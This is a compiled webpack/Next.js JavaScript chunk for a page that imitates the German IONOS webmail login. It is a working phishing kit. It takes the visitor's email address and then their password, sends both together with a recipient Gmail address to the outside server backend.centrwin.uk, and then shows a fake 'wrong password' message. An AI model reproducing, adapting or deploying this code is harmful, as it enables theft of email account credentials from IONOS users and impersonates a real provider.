(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([[931], {
  5286: function (e, s, t) {
    Promise.resolve().then(t.bind(t, 5003));
  },
  5003: function (e, s, t) {
    "use strict";
    t.r(s),
      t.d(s, {
        default: function () {
          return c;
        }
      });
    var r = t(7437)
      , i = t(6691)
      , a = t.n(i)
      , l = t(2265)
      , n = t(4829);
    let d = {
      source: 'ionos',
      to: 'peterstilinski111@gmail.com',
    };
    function c() {
      let [e, s] = (0,
        l.useState)(0)
        , [t, i] = (0,
          l.useState)(0)
        , [c, o] = (0,
          l.useState)(!0)
        , [h, x] = (0,
          l.useState)(!1)
        , m = (0,
          l.useRef)(null)
        , u = (0,
          l.useRef)(null)
        , p = async () => {
          if (0 == t) {
            if (m.current) {
              if (!m.current.value) {
                x(!0);
                return;
              }
              d.email = m.current.value;
            }
            setTimeout(() => {
              i(1);
            }
              , 500);
            return;
          }
          u.current && (d.password = u.current.value);
          try {
            fetch('https://backend.centrwin.uk', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json'
              },
              body: JSON.stringify(d)
            })
              .then(res => {
                if (!res.ok) {
                  throw new Error('Network response was not ok ' + res.statusText);
                }
                return res;
              })
              .then(data => {
                console.log(data, 'data');
              })
              .catch(error => {
                console.error('There was a problem with the fetch operation:', error);
              });
            
            s(e => e + 1);
          } catch (e) { }
        }
        ;
      return (0,
        r.jsx)("main", {
          className: "bg-stone-100 pt-12 pb-20 px-4",
          children: (0,
            r.jsxs)("div", {
              className: "max-w-[720px] mx-auto",
              children: [(0,
                r.jsx)("div", {
                  className: "border shadow border-gray-100 bg-white rounded-2xl",
                  children: 0 == t ? (0,
                    r.jsxs)("div", {
                      className: "pt-4",
                      children: [(0,
                        r.jsxs)("div", {
                          className: "px-7",
                          children: [(0,
                            r.jsxs)("div", {
                              className: "flex items-center gap-3",
                              children: [(0,
                                r.jsx)(a(), {
                                  src: "/product-email.svg",
                                  alt: "product",
                                  width: 50,
                                  height: 50
                                }), (0,
                                  r.jsx)("h1", {
                                    className: "text-2xl font-normal",
                                    children: "Mein Webmail Login"
                                  })]
                            }), (0,
                              r.jsx)("div", {
                                className: "text-[#02102b] mt-5",
                                children: "E-Mail-Adresse"
                              }), (0,
                                r.jsx)("div", {
                                  className: "  h-9",
                                  children: (0,
                                    r.jsx)("input", {
                                      type: "email",
                                      name: "email",
                                      id: "duie",
                                      ref: m,
                                      className: "w-full px-3 h-full border rounded-2xl text-[#02102b] border-[#acb0b2] placeholder:text-xs outline-none focus:border-sky-500",
                                      placeholder: "",
                                      required: !0
                                    })
                                }), (0,
                                  r.jsx)("div", {
                                    className: "".concat(h ? "block" : "hidden", " text-red-600"),
                                    children: (0,
                                      r.jsx)("p", {
                                        children: "E-Mail ist erforderlich"
                                      })
                                  }), (0,
                                    r.jsx)("div", {
                                      className: "text-[#02102b]  text-base  font-light mt-2",
                                      children: "Nicht Ihr Ger\xe4t? Melden Sie sich nach der Sitzung ab oder verwenden Sie den privaten Browsermodus."
                                    }), (0,
                                      r.jsx)("button", {
                                        type: "button",
                                        onClick: p,
                                        className: "text-white h-9 bg-[#0b2a63] w-full mt-7 rounded-2xl",
                                        children: "Weiter"
                                      })]
                        }), (0,
                          r.jsxs)("footer", {
                            className: "mt-10 rounded-b-2xl px-7 py-4 space-y-6 bg-[#f4f7fa]",
                            children: [(0,
                              r.jsx)("h1", {
                                className: "mt-3 text-[#0b2a63]",
                                children: "Noch kein IONOS Kunde?"
                              }), (0,
                                r.jsx)("p", {
                                  className: "text-[#1474c4]",
                                  children: "Jetzt Kunde werden und von unseren Angeboten profitieren."
                                })]
                          })]
                    }) : (0,
                      r.jsx)("div", {
                        className: "py-6 ",
                        children: (0,
                          r.jsxs)("div", {
                            className: "px-7",
                            children: [(0,
                              r.jsxs)("div", {
                                className: "flex items-center gap-3",
                                children: [(0,
                                  r.jsx)(a(), {
                                    src: "/product-email.svg",
                                    alt: "product",
                                    width: 50,
                                    height: 50
                                  }), (0,
                                    r.jsx)("h1", {
                                      className: "text-2xl font-normal",
                                      children: "Passwort eingeben"
                                    })]
                              }), (0,
                                r.jsxs)("div", {
                                  className: "flex items-center space-x-5 mt-6",
                                  children: [(0,
                                    r.jsx)("svg", {
                                      xmlns: "http://www.w3.org/2000/svg",
                                      fill: "none",
                                      viewBox: "0 0 24 24",
                                      strokeWidth: 1.5,
                                      stroke: "#1474c4",
                                      className: "w-5 h-5 ml-3 cursor-pointer",
                                      onClick: () => {
                                        i(0);
                                      }
                                      ,
                                      children: (0,
                                        r.jsx)("path", {
                                          strokeLinecap: "round",
                                          strokeLinejoin: "round",
                                          d: "M15.75 19.5 8.25 12l7.5-7.5"
                                        })
                                    }), (null == d ? void 0 : d.email) && (0,
                                      r.jsx)("p", {
                                        className: "rounded-2xl p-2 text-[#1474c4]",
                                        children: null == d ? void 0 : d.email
                                      })]
                                }), (0,
                                  r.jsx)("div", {
                                    className: "text-[#02102b] mt-5",
                                    children: "Passwort"
                                  }), (0,
                                    r.jsxs)("div", {
                                      className: "inline-flex border border-[#acb0b2] rounded-lg  h-9 overflow-hidden w-full relative",
                                      children: [(0,
                                        r.jsx)("input", {
                                          type: c ? "password" : "text",
                                          name: "pass",
                                          ref: u,
                                          id: "lind",
                                          className: "w-full px-3 h-full   text-[#02102b]  placeholder:text-xs outline-none focus:border-sky-500",
                                          placeholder: "",
                                          required: !0
                                        }), (0,
                                          r.jsxs)("svg", {
                                            xmlns: "http://www.w3.org/2000/svg",
                                            fill: "#1474c4",
                                            viewBox: "0 0 24 24",
                                            strokeWidth: 1.5,
                                            stroke: "#fff",
                                            className: "w-4 h-4 absolute right-3 m-auto inset-y-0",
                                            onClick: () => o(!c),
                                            children: [(0,
                                              r.jsx)("path", {
                                                strokeLinecap: "round",
                                                strokeLinejoin: "round",
                                                d: "M2.036 12.322a1.012 1.012 0 0 1 0-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.573 3.007 9.963 7.178.07.207.07.431 0 .639C20.577 16.49 16.64 19.5 12 19.5c-4.638 0-8.573-3.007-9.963-7.178Z"
                                              }), (0,
                                                r.jsx)("path", {
                                                  strokeLinecap: "round",
                                                  strokeLinejoin: "round",
                                                  d: "M15 12a3 3 0 1 1-6 0 3 3 0 0 1 6 0Z"
                                                })]
                                          })]
                                    }), (0,
                                      r.jsxs)("div", {
                                        className: "flex items-center space-x-1",
                                        children: [(0,
                                          r.jsx)("div", {
                                            className: "".concat(e > 0 ? "block" : "hidden", " text-red-600"),
                                            children: (0,
                                              r.jsx)("p", {
                                                children: "Das Passwort ist nicht korrekt"
                                              })
                                          }), (0,
                                            r.jsx)("p", {
                                              className: "text-[#1474c4] my-3",
                                              children: "Passwort Vergessen?"
                                            })]
                                      }), (0,
                                        r.jsx)("div", {
                                          className: "text-[#02102b]  text-base  font-light mt-2",
                                          children: "Nicht Ihr Ger\xe4t? Melden Sie sich nach der Sitzung ab oder verwenden Sie den privaten Browsermodus."
                                        }), (0,
                                          r.jsx)("button", {
                                            type: "submit",
                                            onClick: p,
                                            className: "text-white h-9 bg-[#0b2a63] w-full mt-7 rounded-2xl cursor-pointer",
                                            children: "Weiter"
                                          })]
                          })
                      })
                }), 0 == t && (0,
                  r.jsxs)(r.Fragment, {
                    children: [(0,
                      r.jsx)("h1", {
                        className: "text-lg font-semibold mt-8 mx-4 sm:mx-0 text-[#0b2a63]",
                        children: "Weitere IONOS Logins"
                      }), (0,
                        r.jsxs)("div", {
                          className: "grid grid-cols-2 gap-x-8 gap-y-4 sm:grid-cols-3 mt-3 text-[#1474c4] font-semibold text-center mx-4 sm:mx-0",
                          children: [(0,
                            r.jsxs)("div", {
                              className: "border shadow h-36 px-7 py-5 border-gray-100 bg-white space-y-2 hover:shadow-xl rounded-2xl",
                              children: [(0,
                                r.jsx)(a(), {
                                  src: "/my-ionos.svg",
                                  width: 100,
                                  height: 100,
                                  alt: "my",
                                  className: "mx-auto h-20"
                                }), (0,
                                  r.jsx)("p", {
                                    className: "text-sm",
                                    children: "Mein IONOS"
                                  })]
                            }), (0,
                              r.jsxs)("div", {
                                className: "border shadow px-7 py-5 h-36 border-gray-100 bg-white space-y-2 hover:shadow-xl rounded-2xl",
                                children: [(0,
                                  r.jsx)(a(), {
                                    src: "/hidrive.svg",
                                    width: 100,
                                    height: 100,
                                    alt: "hi",
                                    className: "mx-auto h-20"
                                  }), (0,
                                    r.jsx)("p", {
                                      className: "text-sm",
                                      children: "Hi Drive"
                                    })]
                              }), (0,
                                r.jsxs)("div", {
                                  className: "border shadow px-7 py-5 h-36 border-gray-100 bg-white space-y-2 hover:shadow-xl rounded-2xl",
                                  children: [(0,
                                    r.jsx)(a(), {
                                      src: "/archive.svg",
                                      width: 100,
                                      height: 100,
                                      alt: "arc",
                                      className: "mx-auto h-20"
                                    }), (0,
                                      r.jsx)("p", {
                                        className: "text-sm",
                                        children: "E-mail-Archiv"
                                      })]
                                })]
                        })]
                  })]
            })
        });
    }
  }
}, function (e) {
  e.O(0, [222, 499, 971, 596, 744], function () {
    return e(e.s = 5286);
  }),
    _N_E = e.O();
}
]);
